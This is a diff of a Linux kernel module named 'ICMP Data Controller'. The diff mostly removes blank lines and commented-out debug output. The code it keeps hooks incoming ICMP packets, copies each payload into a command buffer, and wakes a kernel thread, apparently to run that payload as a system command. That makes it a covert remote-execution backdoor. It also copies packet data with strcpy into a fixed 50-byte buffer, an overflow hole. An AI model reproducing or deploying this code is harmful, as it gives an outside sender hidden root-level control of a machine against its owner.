@@ -13,7 +13,6 @@
 #include <linux/semaphore.h>
 #define DIP "1.2.3.4"
 
-
 static struct nf_hook_ops nfho;     // net filter hook option struct
 struct sk_buff* sock_buff;          // socket buffer used in linux kernel
 struct udphdr* udp_header;          // udp header struct (not used)
@@ -26,28 +25,18 @@ struct semaphore can_execute;
 
 int queue;
 
-
-
 MODULE_DESCRIPTION("ICMP Data Controller");
 MODULE_AUTHOR("Ben Kravets");
 MODULE_LICENSE("GPL");
 
-
-
-
-
 char * envp[] = { "HOME=/","PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
-
-
 
 char commando[50];
 
 int thread_function(void *pv)
 {
     int i=0;
-    
     while(!kthread_should_stop()) {
-    	
         down_interruptible(&can_execute);
         msleep(10);
         if (queue == 1) {  
@@ -63,8 +52,6 @@ int thread_function(void *pv)
     } 
     return 0;
 }
-
-
 
 void pkt_hex_dump(struct sk_buff *skb, int icmp_packet_len)
 {
@@ -86,31 +73,20 @@ void pkt_hex_dump(struct sk_buff *skb, int icmp_packet_len)
     }
     remaining = len;
     
-        linelen = min(remaining, rowsize);
-        linelen = icmp_packet_len;
-        remaining -= rowsize;
-
-        for (l = 0; l < icmp_packet_len; l++) {
-            ch = data[l];
-            
-            command[l] = ch;
-        }
-        command[icmp_packet_len] = '\0';
-
-        //data += linelen;
-        li += 10; 
-
-        printk(KERN_CONT "\n");
-    
+    linelen = min(remaining, rowsize);
+    linelen = icmp_packet_len;
+    remaining -= rowsize;
+    for (l = 0; l < icmp_packet_len; l++) {
+        ch = data[l]; 
+        command[l] = ch;
+    }
+    command[icmp_packet_len] = '\0';
+    li += 10; 
+    printk(KERN_CONT "\n");
     printk("command length: %lu\n", sizeof(command));
     printk("icmp_packet_len: %i\n", icmp_packet_len);
-    //printk("argv0 is: %s\n", argv[0]);
     printk("command is: %s\n", command);
     strcpy(commando, command);
-    //printk("after assign: %s\n", argv[0]);
-    
-    
-    
     return;
 }
 
@@ -123,33 +99,7 @@ unsigned int hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_sta
 	if (!sock_buff) { return NF_DROP; }
 
 	if (ip_header->protocol == IPPROTO_ICMP) { //icmp=1 udp=17 tcp=6
-		//printk(KERN_INFO "Got ICMP Reply packet and dropped it. \n");     //log we’ve got udp packet to /var/log/messages
-		//printk(KERN_INFO "src_ip: %pI4 \n", &ip_header->saddr);
-		//printk(KERN_INFO "dst_ip: %pI4\n", &ip_header->daddr);
-		//ip_header->daddr = in_aton(DIP);
-		//printk(KERN_INFO "modified_dst_ip: %pI4\n", &ip_header->daddr);
-		//printk(KERN_INFO "data: %p\n", &ip_header->saddr);
-		//printk(KERN_INFO "data: %c\n", &ip_header->saddr);
-		//printk(KERN_INFO "data: %s\n", &ip_header->saddr);
-		//printk(KERN_INFO "data: %n\n", &ip_header->ttl);
-		
-		//char information[] = "thequickbrow";
-		//memcpy ( &information, &ip_header->daddr, 10);
-		//printk(KERN_INFO "String1: %s\n", information);
-		//memcpy ( information, &ip_header->saddr, 10);
-		//printk(KERN_INFO "packet length: %i\n", skb->len);
-		//printk(KERN_INFO "data:          %p\n", skb->data);
-		//printk(KERN_INFO "tail:          %c\n", skb->tail);
-		//printk(KERN_INFO "end:           %i\n", skb->end);
-		//printk(KERN_INFO "head:          %p\n", skb->head);
-		//printk(KERN_INFO "data_len:      %u\n", skb->data_len);
-		//printk(KERN_INFO "iphdr          %hu\n", ip_header->ihl);
-		//printk(KERN_INFO "iphdr len:     %u\n", ntohs(ip_header->tot_len));
-		
 		shim = ntohs(ip_header->tot_len) - 4*(ip_header->ihl)-8;
-		
-		//printk(KERN_INFO "shim: %i\n", shim);
-		
 		pkt_hex_dump(skb, shim);
 		queue = 1;
 		up(&can_execute);
